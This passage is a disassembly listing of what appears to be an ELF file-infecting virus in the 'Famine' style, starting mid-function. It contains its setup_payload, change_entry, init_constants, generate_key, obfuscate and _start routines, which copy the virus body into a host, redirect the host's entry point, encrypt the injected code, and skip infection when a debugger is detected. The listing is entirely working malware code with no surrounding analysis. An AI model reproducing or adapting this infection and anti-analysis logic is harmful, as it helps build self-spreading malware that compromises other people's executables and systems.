    331b:	48 8d 0d de dc ff ff 	lea    -0x2322(%rip),%rcx        # 1000 <famine_entry>
    3322:	48 29 c8             	sub    %rcx,%rax
    3325:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    3329:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    332d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    3331:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    3335:	48 8b 40 10          	mov    0x10(%rax),%rax
    3339:	48 8b 40 20          	mov    0x20(%rax),%rax
    333d:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    3341:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    3345:	48 8b 00             	mov    (%rax),%rax
    3348:	48 8b 40 20          	mov    0x20(%rax),%rax
    334c:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    3350:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    3354:	48 8b 00             	mov    (%rax),%rax
    3357:	48 8b 40 28          	mov    0x28(%rax),%rax
    335b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    335f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    3363:	48 03 45 e0          	add    -0x20(%rbp),%rax
    3367:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    336b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    336f:	48 03 45 d8          	add    -0x28(%rbp),%rax
    3373:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    3377:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    337b:	48 03 45 d0          	add    -0x30(%rbp),%rax
    337f:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    3383:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3387:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    338b:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    338f:	48 89 41 20          	mov    %rax,0x20(%rcx)
    3393:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    3397:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    339b:	48 8b 09             	mov    (%rcx),%rcx
    339e:	48 89 41 20          	mov    %rax,0x20(%rcx)
    33a2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    33a6:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    33aa:	48 8b 09             	mov    (%rcx),%rcx
    33ad:	48 89 41 28          	mov    %rax,0x28(%rcx)
    33b1:	b2 01                	mov    $0x1,%dl
    33b3:	80 e2 01             	and    $0x1,%dl
    33b6:	0f b6 c2             	movzbl %dl,%eax
    33b9:	5d                   	pop    %rbp
    33ba:	c3                   	retq   
    33bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000033c0 <change_entry>:
    33c0:	55                   	push   %rbp
    33c1:	48 89 e5             	mov    %rsp,%rbp
    33c4:	48 83 ec 60          	sub    $0x60,%rsp
    33c8:	31 c0                	xor    %eax,%eax
    33ca:	89 c1                	mov    %eax,%ecx
    33cc:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    33d0:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    33d4:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    33d8:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    33dc:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    33e0:	48 89 cf             	mov    %rcx,%rdi
    33e3:	b9 40 00 00 00       	mov    $0x40,%ecx
    33e8:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
    33ec:	48 89 ce             	mov    %rcx,%rsi
    33ef:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
    33f3:	e8 58 e8 ff ff       	callq  1c50 <safe_accessor>
    33f8:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    33fc:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
    3401:	0f 85 09 00 00 00    	jne    3410 <change_entry+0x50>
    3407:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    340b:	e9 68 00 00 00       	jmpq   3478 <change_entry+0xb8>
    3410:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3414:	48 8b 40 08          	mov    0x8(%rax),%rax
    3418:	48 8b 40 18          	mov    0x18(%rax),%rax
    341c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    3420:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3424:	48 8b 40 20          	mov    0x20(%rax),%rax
    3428:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    342c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    3430:	48 03 45 c8          	add    -0x38(%rbp),%rax
    3434:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    3438:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    343c:	48 8b 40 18          	mov    0x18(%rax),%rax
    3440:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    3444:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3448:	48 2b 45 c0          	sub    -0x40(%rbp),%rax
    344c:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    3450:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    3454:	48 8b 40 18          	mov    0x18(%rax),%rax
    3458:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    345c:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    3460:	48 03 45 a8          	add    -0x58(%rbp),%rax
    3464:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    3468:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    346c:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    3470:	48 89 41 18          	mov    %rax,0x18(%rcx)
    3474:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    3478:	8a 45 ff             	mov    -0x1(%rbp),%al
    347b:	24 01                	and    $0x1,%al
    347d:	0f b6 c0             	movzbl %al,%eax
    3480:	48 83 c4 60          	add    $0x60,%rsp
    3484:	5d                   	pop    %rbp
    3485:	c3                   	retq   
    3486:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    348d:	00 00 00 

0000000000003490 <setup_payload>:
    3490:	55                   	push   %rbp
    3491:	48 89 e5             	mov    %rsp,%rbp
    3494:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
    349b:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    349f:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
    34a3:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    34a7:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    34ab:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
    34af:	e8 2c 01 00 00       	callq  35e0 <init_constants>
    34b4:	48 8d 05 e5 02 00 00 	lea    0x2e5(%rip),%rax        # 37a0 <_start>
    34bb:	48 8d 0d 3e db ff ff 	lea    -0x24c2(%rip),%rcx        # 1000 <famine_entry>
    34c2:	48 29 c8             	sub    %rcx,%rax
    34c5:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    34c9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    34cd:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    34d1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    34d5:	48 8b 40 18          	mov    0x18(%rax),%rax
    34d9:	48 89 45 90          	mov    %rax,-0x70(%rbp)
    34dd:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    34e1:	48 03 45 c8          	add    -0x38(%rbp),%rax
    34e5:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    34e9:	48 8b 7d 90          	mov    -0x70(%rbp),%rdi
    34ed:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
    34f1:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    34f5:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    34f9:	e8 52 e7 ff ff       	callq  1c50 <safe_accessor>
    34fe:	48 89 45 80          	mov    %rax,-0x80(%rbp)
    3502:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    3506:	48 05 05 00 00 00    	add    $0x5,%rax
    350c:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    3510:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    3514:	48 89 c7             	mov    %rax,%rdi
    3517:	be 38 00 00 00       	mov    $0x38,%esi
    351c:	e8 2f e7 ff ff       	callq  1c50 <safe_accessor>
    3521:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
    3528:	48 8b 7d 88          	mov    -0x78(%rbp),%rdi
    352c:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    3530:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    3534:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    3538:	e8 13 e7 ff ff       	callq  1c50 <safe_accessor>
    353d:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
    3544:	48 83 7d 80 00       	cmpq   $0x0,-0x80(%rbp)
    3549:	0f 84 1c 00 00 00    	je     356b <setup_payload+0xdb>
    354f:	48 83 bd 78 ff ff ff 	cmpq   $0x0,-0x88(%rbp)
    3556:	00 
    3557:	0f 84 0e 00 00 00    	je     356b <setup_payload+0xdb>
    355d:	48 83 bd 70 ff ff ff 	cmpq   $0x0,-0x90(%rbp)
    3564:	00 
    3565:	0f 85 09 00 00 00    	jne    3574 <setup_payload+0xe4>
    356b:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    356f:	e9 5a 00 00 00       	jmpq   35ce <setup_payload+0x13e>
    3574:	48 8d 05 85 da ff ff 	lea    -0x257b(%rip),%rax        # 1000 <famine_entry>
    357b:	48 8b 7d 80          	mov    -0x80(%rbp),%rdi
    357f:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
    3583:	48 89 c6             	mov    %rax,%rsi
    3586:	e8 c5 dd ff ff       	callq  1350 <ft_memcpy>
    358b:	48 8b bd 78 ff ff ff 	mov    -0x88(%rbp),%rdi
    3592:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
    3596:	48 89 ce             	mov    %rcx,%rsi
    3599:	ba 38 00 00 00       	mov    $0x38,%edx
    359e:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
    35a5:	e8 a6 dd ff ff       	callq  1350 <ft_memcpy>
    35aa:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
    35ae:	48 8b b5 70 ff ff ff 	mov    -0x90(%rbp),%rsi
    35b5:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
    35b9:	bf 20 00 00 00       	mov    $0x20,%edi
    35be:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
    35c5:	e8 96 ee ff ff       	callq  2460 <encrypt>
    35ca:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    35ce:	8a 45 ff             	mov    -0x1(%rbp),%al
    35d1:	24 01                	and    $0x1,%al
    35d3:	0f b6 c0             	movzbl %al,%eax
    35d6:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
    35dd:	5d                   	pop    %rbp
    35de:	c3                   	retq   
    35df:	90                   	nop

00000000000035e0 <init_constants>:
    35e0:	55                   	push   %rbp
    35e1:	48 89 e5             	mov    %rsp,%rbp
    35e4:	48 83 ec 40          	sub    $0x40,%rsp
    35e8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    35ec:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    35f0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    35f4:	48 89 c7             	mov    %rax,%rdi
    35f7:	be 10 00 00 00       	mov    $0x10,%esi
    35fc:	e8 af 00 00 00       	callq  36b0 <generate_key>
    3601:	48 8d 05 98 01 00 00 	lea    0x198(%rip),%rax        # 37a0 <_start>
    3608:	48 8d 0d 91 e5 ff ff 	lea    -0x1a6f(%rip),%rcx        # 1ba0 <virus>
    360f:	48 29 c8             	sub    %rcx,%rax
    3612:	48 8d 15 e7 d9 ff ff 	lea    -0x2619(%rip),%rdx        # 1000 <famine_entry>
    3619:	48 29 d1             	sub    %rdx,%rcx
    361c:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    3620:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    3624:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    3628:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    362c:	48 8b 12             	mov    (%rdx),%rdx
    362f:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    3633:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    3637:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    363b:	48 8b 12             	mov    (%rdx),%rdx
    363e:	48 8b 52 28          	mov    0x28(%rdx),%rdx
    3642:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    3646:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    364a:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    364e:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    3652:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
    3656:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    365a:	48 2b 55 d0          	sub    -0x30(%rbp),%rdx
    365e:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
    3662:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    3666:	48 2b 55 e0          	sub    -0x20(%rbp),%rdx
    366a:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
    366e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
    3672:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    3676:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
    367a:	48 89 56 18          	mov    %rdx,0x18(%rsi)
    367e:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    3682:	48 89 4a 20          	mov    %rcx,0x20(%rdx)
    3686:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    368a:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    368e:	48 2b 4a 20          	sub    0x20(%rdx),%rcx
    3692:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    3696:	48 89 4a 28          	mov    %rcx,0x28(%rdx)
    369a:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    369e:	48 89 41 30          	mov    %rax,0x30(%rcx)
    36a2:	48 83 c4 40          	add    $0x40,%rsp
    36a6:	5d                   	pop    %rbp
    36a7:	c3                   	retq   
    36a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    36af:	00 

00000000000036b0 <generate_key>:
    36b0:	55                   	push   %rbp
    36b1:	48 89 e5             	mov    %rsp,%rbp
    36b4:	48 83 ec 10          	sub    $0x10,%rsp
    36b8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    36bc:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    36c0:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    36c4:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    36c8:	e8 a3 da ff ff       	callq  1170 <ft_getrandom>
    36cd:	48 83 c4 10          	add    $0x10,%rsp
    36d1:	5d                   	pop    %rbp
    36d2:	c3                   	retq   
    36d3:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    36da:	00 00 00 
    36dd:	0f 1f 00             	nopl   (%rax)

00000000000036e0 <obfuscate>:
    36e0:	55                   	push   %rbp
    36e1:	48 89 e5             	mov    %rsp,%rbp
    36e4:	48 83 ec 30          	sub    $0x30,%rsp
    36e8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    36ec:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    36f0:	c6 45 ef e8          	movb   $0xe8,-0x11(%rbp)
    36f4:	c6 45 ee 15          	movb   $0x15,-0x12(%rbp)
    36f8:	c6 45 ed e8          	movb   $0xe8,-0x13(%rbp)
    36fc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    3700:	48 8b 40 10          	mov    0x10(%rax),%rax
    3704:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    3708:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    370c:	48 03 41 18          	add    0x18(%rcx),%rax
    3710:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    3714:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3718:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    371c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    3720:	48 03 41 20          	add    0x20(%rcx),%rax
    3724:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    3728:	bf 01 00 00 00       	mov    $0x1,%edi
    372d:	48 8d 35 cc 08 00 00 	lea    0x8cc(%rip),%rsi        # 4000 <_start+0x860>
    3734:	ba 04 00 00 00       	mov    $0x4,%edx
    3739:	b0 00                	mov    $0x0,%al
    373b:	e8 30 dd ff ff       	callq  1470 <dprintf>
    3740:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3744:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
    3748:	0f 83 3e 00 00 00    	jae    378c <obfuscate+0xac>
    374e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3752:	0f b6 c8             	movzbl %al,%ecx
    3755:	81 f9 e8 00 00 00    	cmp    $0xe8,%ecx
    375b:	0f 85 18 00 00 00    	jne    3779 <obfuscate+0x99>
    3761:	bf 01 00 00 00       	mov    $0x1,%edi
    3766:	48 8d 35 98 08 00 00 	lea    0x898(%rip),%rsi        # 4005 <_start+0x865>
    376d:	ba 06 00 00 00       	mov    $0x6,%edx
    3772:	b0 00                	mov    $0x0,%al
    3774:	e8 f7 dc ff ff       	callq  1470 <dprintf>
    3779:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    377d:	48 05 01 00 00 00    	add    $0x1,%rax
    3783:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    3787:	e9 b4 ff ff ff       	jmpq   3740 <obfuscate+0x60>
    378c:	b0 01                	mov    $0x1,%al
    378e:	24 01                	and    $0x1,%al
    3790:	0f b6 c0             	movzbl %al,%eax
    3793:	48 83 c4 30          	add    $0x30,%rsp
    3797:	5d                   	pop    %rbp
    3798:	c3                   	retq   
    3799:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000037a0 <_start>:
    37a0:	55                   	push   %rbp
    37a1:	48 89 e5             	mov    %rsp,%rbp
    37a4:	e8 87 df ff ff       	callq  1730 <detect_spy>
    37a9:	24 01                	and    $0x1,%al
    37ab:	0f b6 c8             	movzbl %al,%ecx
    37ae:	83 f9 00             	cmp    $0x0,%ecx
    37b1:	0f 85 05 00 00 00    	jne    37bc <_start+0x1c>
    37b7:	e8 e4 e3 ff ff       	callq  1ba0 <virus>
    37bc:	31 ff                	xor    %edi,%edi
    37be:	e8 0d df ff ff       	callq  16d0 <famine_exit>

Disassembly of section .rodata:

0000000000004000 <.rodata>:
    4000:	6c                   	insb   (%dx),%es:(%rdi)
    4001:	6f                   	outsl  %ds:(%rsi),(%dx)
    4002:	6c                   	insb   (%dx),%es:(%rdi)
    4003:	0a 00                	or     (%rax),%al
    4005:	66 6f                	outsw  %ds:(%rsi),(%dx)
    4007:	75 6e                	jne    4077 <__GNU_EH_FRAME_HDR+0x6b>
    4009:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

000000000000400c <__GNU_EH_FRAME_HDR>:
    400c:	01 1b                	add    %ebx,(%rbx)
    400e:	03 3b                	add    (%rbx),%edi
    4010:	e0 01                	loopne 4013 <__GNU_EH_FRAME_HDR+0x7>
    4012:	00 00                	add    %al,(%rax)
    4014:	3b 00                	cmp    (%rax),%eax
    4016:	00 00                	add    %al,(%rax)
    4018:	64 d1 ff             	fs sar %edi
    401b:	ff                   	(bad)  
    401c:	fc                   	cld    
    401d:	01 00                	add    %eax,(%rax)
    401f:	00 14 d2             	add    %dl,(%rdx,%rdx,8)
    4022:	ff                   	(bad)  
    4023:	ff 1c 02             	lcall  *(%rdx,%rax,1)
    4026:	00 00                	add    %al,(%rax)
    4028:	64 d2 ff             	fs sar %cl,%bh
    402b:	ff                   	(bad)  
    402c:	3c 02                	cmp    $0x2,%al
    402e:	00 00                	add    %al,(%rax)
    4030:	04 d3                	add    $0xd3,%al
    4032:	ff                   	(bad)  
    4033:	ff 5c 02 00          	lcall  *0x0(%rdx,%rax,1)
    4037:	00 44 d3 ff          	add    %al,-0x1(%rbx,%rdx,8)
    403b:	ff                   	(bad)  
    403c:	7c 02                	jl     4040 <__GNU_EH_FRAME_HDR+0x34>
    403e:	00 00                	add    %al,(%rax)
    4040:	b4 d3                	mov    $0xd3,%ah
    4042:	ff                   	(bad)  
    4043:	ff 9c 02 00 00 14 d4 	lcall  *-0x2bec0000(%rdx,%rax,1)
    404a:	ff                   	(bad)  
    404b:	ff                   	(bad)  
    404c:	bc 02 00 00 64       	mov    $0x64000002,%esp
    4051:	d4                   	(bad)  
    4052:	ff                   	(bad)  
    4053:	ff                   	(bad)  
    4054:	dc 02                	faddl  (%rdx)
    4056:	00 00                	add    %al,(%rax)
    4058:	a4                   	movsb  %ds:(%rsi),%es:(%rdi)
    4059:	d4                   	(bad)  
    405a:	ff                   	(bad)  
    405b:	ff                   	(bad)  
    405c:	fc                   	cld    
    405d:	02 00                	add    (%rax),%al
    405f:	00 b4 d5 ff ff 1c 03 	add    %dh,0x31cffff(%rbp,%rdx,8)
    4066:	00 00                	add    %al,(%rax)
    4068:	d4                   	(bad)  
    4069:	d5                   	(bad)  
    406a:	ff                   	(bad)  
    406b:	ff                   	(bad)  
    406c:	38 03                	cmp    %al,(%rbx)
    406e:	00 00                	add    %al,(%rax)
    4070:	f4                   	hlt    
    4071:	d5                   	(bad)  
    4072:	ff                   	(bad)  
    4073:	ff 54 03 00          	callq  *0x0(%rbx,%rax,1)
    4077:	00 14 d6             	add    %dl,(%rsi,%rdx,8)
    407a:	ff                   	(bad)  
    407b:	ff 70 03             	pushq  0x3(%rax)
    407e:	00 00                	add    %al,(%rax)
    4080:	34 d6                	xor    $0xd6,%al
    4082:	ff                   	(bad)  
    4083:	ff 8c 03 00 00 54 d6 	decl   -0x29ac0000(%rbx,%rax,1)
    408a:	ff                   	(bad)  
    408b:	ff a8 03 00 00 84    	ljmp   *-0x7bfffffd(%rax)
    4091:	d6                   	(bad)  
    4092:	ff                   	(bad)  
    4093:	ff c4                	inc    %esp
    4095:	03 00                	add    (%rax),%eax
    4097:	00 a4 d6 ff ff e0 03 	add    %ah,0x3e0ffff(%rsi,%rdx,8)
    409e:	00 00                	add    %al,(%rax)
    40a0:	c4                   	(bad)  
    40a1:	d6                   	(bad)  
    40a2:	ff                   	(bad)  
    40a3:	ff                   	(bad)  
    40a4:	fc                   	cld    
    40a5:	03 00                	add    (%rax),%eax
    40a7:	00 e4                	add    %ah,%ah
    40a9:	d6                   	(bad)  
    40aa:	ff                   	(bad)  
    40ab:	ff 18                	lcall  *(%rax)
    40ad:	04 00                	add    $0x0,%al
    40af:	00 04 d7             	add    %al,(%rdi,%rdx,8)
    40b2:	ff                   	(bad)  
    40b3:	ff 34 04             	pushq  (%rsp,%rax,1)
    40b6:	00 00                	add    %al,(%rax)
    40b8:	24 d7                	and    $0xd7,%al
    40ba:	ff                   	(bad)  
    40bb:	ff 54 04 00          	callq  *0x0(%rsp,%rax,1)
    40bf:	00 74 d7 ff          	add    %dh,-0x1(%rdi,%rdx,8)
    40c3:	ff 74 04 00          	pushq  0x0(%rsp,%rax,1)
    40c7:	00 c4                	add    %al,%ah
    40c9:	d8 ff                	fdivr  %st(7),%st
    40cb:	ff 94 04 00 00 b4 d9 	callq  *-0x264c0000(%rsp,%rax,1)
    40d2:	ff                   	(bad)  
    40d3:	ff b4 04 00 00 94 db 	pushq  -0x246c0000(%rsp,%rax,1)
    40da:	ff                   	(bad)  
    40db:	ff d4                	callq  *%rsp
    40dd:	04 00                	add    $0x0,%al
    40df:	00 44 dc ff          	add    %al,-0x1(%rsp,%rbx,8)
    40e3:	ff f4                	push   %rsp
    40e5:	04 00                	add    $0x0,%al
    40e7:	00 a4 dc ff ff 14 05 	add    %ah,0x514ffff(%rsp,%rbx,8)
    40ee:	00 00                	add    %al,(%rax)
    40f0:	04 dd                	add    $0xdd,%al
    40f2:	ff                   	(bad)  
    40f3:	ff 34 05 00 00 44 de 	pushq  -0x21bc0000(,%rax,1)
    40fa:	ff                   	(bad)  
    40fb:	ff 54 05 00          	callq  *0x0(%rbp,%rax,1)
    40ff:	00 d4                	add    %dl,%ah
    4101:	de ff                	fdivrp %st,%st(7)
    4103:	ff 74 05 00          	pushq  0x0(%rbp,%rax,1)
    4107:	00 64 df ff          	add    %ah,-0x1(%rdi,%rbx,8)
    410b:	ff 94 05 00 00 64 e0 	callq  *-0x1f9c0000(%rbp,%rax,1)
    4112:	ff                   	(bad)  
    4113:	ff b4 05 00 00 b4 e0 	pushq  -0x1f4c0000(%rbp,%rax,1)
    411a:	ff                   	(bad)  
    411b:	ff d4                	callq  *%rsp
    411d:	05 00 00 04 e1       	add    $0xe1040000,%eax
    4122:	ff                   	(bad)  
    4123:	ff f4                	push   %rsp
    4125:	05 00 00 a4 e1       	add    $0xe1a40000,%eax
    412a:	ff                   	(bad)  
    412b:	ff 14 06             	callq  *(%rsi,%rax,1)
    412e:	00 00                	add    %al,(%rax)
    4130:	44 e2 ff             	rex.R loop 4132 <__GNU_EH_FRAME_HDR+0x126>
    4133:	ff 34 06             	pushq  (%rsi,%rax,1)
    4136:	00 00                	add    %al,(%rax)
    4138:	f4                   	hlt    
    4139:	e2 ff                	loop   413a <__GNU_EH_FRAME_HDR+0x12e>
    413b:	ff 54 06 00          	callq  *0x0(%rsi,%rax,1)
    413f:	00 a4 e3 ff ff 74 06 	add    %ah,0x674ffff(%rbx,%riz,8)
    4146:	00 00                	add    %al,(%rax)
    4148:	24 e5                	and    $0xe5,%al
    414a:	ff                   	(bad)  
    414b:	ff 94 06 00 00 94 e5 	callq  *-0x1a6c0000(%rsi,%rax,1)
    4152:	ff                   	(bad)  
    4153:	ff b4 06 00 00 44 e6 	pushq  -0x19bc0000(%rsi,%rax,1)
    415a:	ff                   	(bad)  
    415b:	ff d4                	callq  *%rsp
    415d:	06                   	(bad)  
    415e:	00 00                	add    %al,(%rax)
    4160:	24 e7                	and    $0xe7,%al
    4162:	ff                   	(bad)  
    4163:	ff f4                	push   %rsp
    4165:	06                   	(bad)  
    4166:	00 00                	add    %al,(%rax)
    4168:	74 e8                	je     4152 <__GNU_EH_FRAME_HDR+0x146>
    416a:	ff                   	(bad)  
    416b:	ff 14 07             	callq  *(%rdi,%rax,1)
    416e:	00 00                	add    %al,(%rax)
    4170:	34 e9                	xor    $0xe9,%al
    4172:	ff                   	(bad)  
    4173:	ff 34 07             	pushq  (%rdi,%rax,1)
    4176:	00 00                	add    %al,(%rax)
    4178:	74 ea                	je     4164 <__GNU_EH_FRAME_HDR+0x158>
    417a:	ff                   	(bad)  
    417b:	ff 54 07 00          	callq  *0x0(%rdi,%rax,1)
    417f:	00 24 eb             	add    %ah,(%rbx,%rbp,8)
    4182:	ff                   	(bad)  
    4183:	ff 74 07 00          	pushq  0x0(%rdi,%rax,1)
    4187:	00 74 eb ff          	add    %dh,-0x1(%rbx,%rbp,8)
    418b:	ff 94 07 00 00 d4 ec 	callq  *-0x132c0000(%rdi,%rax,1)
    4192:	ff                   	(bad)  
    4193:	ff b4 07 00 00 84 ed 	pushq  -0x127c0000(%rdi,%rax,1)
    419a:	ff                   	(bad)  
    419b:	ff d4                	callq  *%rsp
    419d:	07                   	(bad)  
    419e:	00 00                	add    %al,(%rax)
    41a0:	04 ef                	add    $0xef,%al
    41a2:	ff                   	(bad)  
    41a3:	ff f4                	push   %rsp
    41a5:	07                   	(bad)  
    41a6:	00 00                	add    %al,(%rax)
    41a8:	84 f0                	test   %dh,%al
    41aa:	ff                   	(bad)  
    41ab:	ff 14 08             	callq  *(%rax,%rcx,1)
    41ae:	00 00                	add    %al,(%rax)
    41b0:	14 f2                	adc    $0xf2,%al
    41b2:	ff                   	(bad)  
    41b3:	ff 34 08             	pushq  (%rax,%rcx,1)
    41b6:	00 00                	add    %al,(%rax)
    41b8:	04 f3                	add    $0xf3,%al
    41ba:	ff                   	(bad)  
    41bb:	ff 54 08 00          	callq  *0x0(%rax,%rcx,1)
    41bf:	00 b4 f3 ff ff 74 08 	add    %dh,0x874ffff(%rbx,%rsi,8)
    41c6:	00 00                	add    %al,(%rax)
    41c8:	84 f4                	test   %dh,%ah
    41ca:	ff                   	(bad)  
    41cb:	ff 94 08 00 00 d4 f5 	callq  *-0xa2c0000(%rax,%rcx,1)
    41d2:	ff                   	(bad)  
    41d3:	ff b4 08 00 00 a4 f6 	pushq  -0x95c0000(%rax,%rcx,1)
    41da:	ff                   	(bad)  
    41db:	ff d4                	callq  *%rsp
    41dd:	08 00                	or     %al,(%rax)
    41df:	00 d4                	add    %dl,%ah
    41e1:	f6 ff                	idiv   %bh
    41e3:	ff f4                	push   %rsp
    41e5:	08 00                	or     %al,(%rax)
    41e7:	00 94 f7 ff ff 14 09 	add    %dl,0x914ffff(%rdi,%rsi,8)
	...

Disassembly of section .eh_frame:

00000000000041f0 <.eh_frame>:
    41f0:	14 00                	adc    $0x0,%al
    41f2:	00 00                	add    %al,(%rax)
    41f4:	00 00                	add    %al,(%rax)
    41f6:	00 00                	add    %al,(%rax)
    41f8:	01 7a 52             	add    %edi,0x52(%rdx)
    41fb:	00 01                	add    %al,(%rcx)
    41fd:	78 10                	js     420f <__GNU_EH_FRAME_HDR+0x203>
    41ff:	01 1b                	add    %ebx,(%rbx)
    4201:	0c 07                	or     $0x7,%al
